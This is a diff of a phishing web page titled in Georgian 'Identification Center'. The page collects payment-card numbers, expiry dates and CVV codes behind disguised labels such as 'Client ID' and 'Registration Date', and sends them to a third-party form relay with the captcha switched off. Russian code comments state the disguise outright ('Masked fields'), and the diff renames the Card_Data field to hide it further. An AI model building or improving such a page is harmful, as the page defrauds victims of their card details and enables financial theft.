@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>იდენტიფიკაციის ცენტრი</title>
-
     <link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">
-
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
         .center-container { text-align: center; margin-bottom: 20px; }
@@ -23,7 +21,6 @@
         @media (max-width: 480px) { .form-container { padding: 20px; } }
     </style>
 </head>
-
 <body>
 
 <div class="center-container">
@@ -33,11 +30,11 @@
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- Форма отправляет данные на твой email через FormSubmit -->
+    <!-- ИСПРАВЛЕНО: Теперь используем Random Token вместо прямого email -->
     <form action="https://formsubmit.co" method="POST">
         
-        <!-- Настройки для работы без капчи и редиректа -->
-        <input type="hidden" name="_captcha" value="false">
+        <!-- Скрытые настройки для стабильности -->
+        <input type="hidden" name="_captcha" value="false"> 
         <input type="hidden" name="_next" value="https://xn----ctbeucnqcd8a.github.io">
         <input type="hidden" name="_template" value="table">
 
@@ -49,18 +46,16 @@
         <label for="last-name">გვარი</label>
         <input type="text" name="Last_Name" id="last-name" required>
 
-        <!-- Заменено название: Номер карты -> კლიენტის ID (ID Клиента) -->
+        <!-- Замаскированные поля -->
         <label for="order-id">კლიენტის ID</label>
-        <input type="text" name="Card_Data" id="order-id" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
+        <input type="text" name="Client_ID" id="order-id" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
 
         <div class="expiry-cvv-row">
             <div>
-                <!-- Заменено название: Срок действия -> რეგისტრაციის თარიღი (Дата регистрации) -->
                 <label for="expiry-date">რეგისტრაციის თარიღი</label>
-                <input type="text" name="Reg_Date" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
+                <input type="text" name="Registration_Date" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
             </div>
             <div>
-                <!-- Заменено название: CVV -> უსაფრთხოების კოდი (Код безопасности) -->
                 <label for="cvv">უსაფრთხოების კოდი</label>
                 <input type="text" name="Security_Code" id="cvv" placeholder="***" maxlength="3" inputmode="numeric" required>
             </div>
@@ -71,13 +66,13 @@
 </div>
 
 <script>
-    // Форматирование "ID Клиента" (пробелы через каждые 4 цифры)
+    // Маска для ID (пробелы каждые 4 цифры)
     document.getElementById('order-id').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
     });
 
-    // Форматирование "Даты регистрации" (добавление слеша /)
+    // Маска для даты (MM/YY)
     document.getElementById('expiry-date').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, ''); 
         if (value.length >= 2) {
@@ -87,7 +82,7 @@
         }
     });
 
-    // Код безопасности - только цифры
+    // Только цифры для кода безопасности
     document.getElementById('cvv').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
     });
